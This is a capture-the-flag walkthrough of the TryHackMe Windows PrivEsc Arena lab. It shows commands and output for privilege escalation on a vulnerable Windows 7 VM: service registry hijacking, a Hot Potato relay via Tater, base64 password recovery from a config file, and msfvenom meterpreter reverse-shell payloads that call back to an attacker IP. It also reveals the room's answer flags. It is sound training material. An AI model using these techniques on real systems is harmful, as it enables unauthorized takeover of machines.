---
description: >-
  Students will learn how to escalate privileges using a very vulnerable Windows
  7 VM. RDP is open. Your credentials are user:password321
---

# 🛗 Windows PrivEsc Arena

{% embed url="https://tryhackme.com/room/windowsprivescarena" %}
[https://tryhackme.com/room/windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)
{% endembed %}

| Room Attributes       | Value                                                                   |
| --------------------- | ----------------------------------------------------------------------- |
| Subscription Required |  <mark style="color:green;background-color:green;">False</mark> \[Free] |
| Type                  | Walkthroughs                                                            |
| Difficulty            |  <mark style="color:orange;background-color:yellow;">Medium</mark>      |
| Tags                  | Security, Windows, PrivEsc                                              |



## Task 1 Connecting to TryHackMe network

### Connect to TryHackMe's VPN.

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 2 Deploy the vulnerable machine

### Deploy the machine and log into the user account via RDP

{% embed url="https://www.kali.org/tools/rdesktop/" %}
[https://www.kali.org/tools/rdesktop/](https://www.kali.org/tools/rdesktop/)
{% endembed %}

```
rdesktop TARGET_IP:3389 -u user -p password321
```

{% hint style="success" %}
No answer needed
{% endhint %}

### Open a command prompt and run 'net user'. Who is the other non-default user on the machine?

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`TCM`

</details>

## Task 3 Registry Escalation - Autorun

```
C:\Users\user>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Pro
gram Files\Autorun Program"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

```
meterpreter > getuid
Server username: TCM-PC\TCM
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 4 Registry Escalation - AlwaysInstallElevated

```
PS C:\Users\TCM> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 5 Service Escalation - Registry

```
C:\Users\TCM>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath
/t REG_EXPAND_SZ /d c:\temp\x.exe /f
The operation completed successfully.
```

```
C:\Users\TCM>sc start regsvc

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3400
        FLAGS              :
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 6 Service Escalation - Executable Files

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 7 Privilege Escalation - Startup Applications

```
C:\Users\TCM>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
    TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
    Everyone:(I)(OI)(CI)(RX)
```

```
kali@kali  ~/Documents/THM/windowsprivescarena  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.12.198 -f exe -o x.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: x.exe
```

```
C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 8 Service Escalation - DLL Hijacking

###

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 9 Service Escalation - binPath

```
C:\Users\user>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 10 Service Escalation - Unquoted Service Paths

```
C:\Users\user>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files
\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 11 Potato Escalation - Hot Potato

```
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> powershell.exe -nop -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
PS C:\Users\user> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
2022-06-26T13:24:46 - Tater (Hot Potato Privilege Escalation) started
Local IP Address = 10.10.99.186
Spoofing Hostname = WPAD
Windows Defender Trigger Enabled
Real Time Console Output Enabled
Run Stop-Tater to stop Tater early
Use Get-Command -Noun Tater* to show available functions
Press any key to stop real time console output

2022-06-26T13:24:46 - Flushing DNS resolver cache
2022-06-26T13:24:46 - Waiting for incoming HTTP connection
2022-06-26T13:24:48 - Starting NBNS spoofer to resolve WPAD to 127.0.0.1
2022-06-26T13:24:50 - WPAD has been spoofed to 127.0.0.1
2022-06-26T13:24:50 - Running Windows Defender signature update
2022-06-26T13:24:51 - HTTP request for /wpad.dat received from 127.0.0.1
2022-06-26T13:24:55 - Attempting to redirect to http://localhost:80/gethashes and trigger relay
2022-06-26T13:24:55 - HTTP request for http://download.windowsupdate.com/v9/windowsupdate/redir/muv4wuredir.cab?2206261
724 received from 127.0.0.1
2022-06-26T13:24:59 - HTTP request for /GETHASHES received from 127.0.0.1
2022-06-26T13:25:00 - HTTP to SMB relay triggered by 127.0.0.1
2022-06-26T13:25:00 - Grabbing challenge for relay from 127.0.0.1
2022-06-26T13:25:00 - Received challenge DA38D881138086D0 for relay from 127.0.0.1
2022-06-26T13:25:00 - Providing challenge DA38D881138086D0 for relay to 127.0.0.1
2022-06-26T13:25:01 - Sending response for \ for relay to 127.0.0.1
2022-06-26T13:25:01 - HTTP to SMB relay authentication successful for \ on 127.0.0.1
2022-06-26T13:25:01 - SMB relay service TGPVBCIOUBVVLFQRJQFL created on 127.0.0.1
2022-06-26T13:25:01 - Command likely executed on 127.0.0.1
2022-06-26T13:25:01 - SMB relay service TGPVBCIOUBVVLFQRJQFL deleted on 127.0.0.1
2022-06-26T13:25:02 - Stopping HTTP listener
2022-06-26T13:25:05 - Tater was successful and has exited
```

```
PS C:\Users\user> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 12 Password Mining Escalation - Configuration Files

```
<AutoLogon>
    <Password>
        <Value>cGFzc3dvcmQxMjM=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Admin</Username>
</AutoLogon>
```

{% embed url="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Y0dGemMzZHZjbVF4TWpNPQ" %}
[https://gchq.github.io/CyberChef/#recipe=From\_Base64('A-Za-z0-9%2B/%3D',true,false)\&input=Y0dGemMzZHZjbVF4TWpNPQ](https://gchq.github.io/CyberChef/#recipe=From\_Base64\('A-Za-z0-9%2B/%3D',true,false\)\&input=Y0dGemMzZHZjbVF4TWpNPQ)
{% endembed %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`password123`

</details>

## Task 13 Password Mining Escalation - Memory

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 14 Privilege Escalation - Kernel Exploits

```
kali@kali  ~/Documents/THM/windowsprivescarena  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.9.12.198 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.99.186 - Collecting local exploits for x86/windows...
[*] 10.10.99.186 - 40 exploit checks are being tried...
[+] 10.10.99.186 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.99.186 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
```

{% hint style="success" %}
No answer needed
{% endhint %}

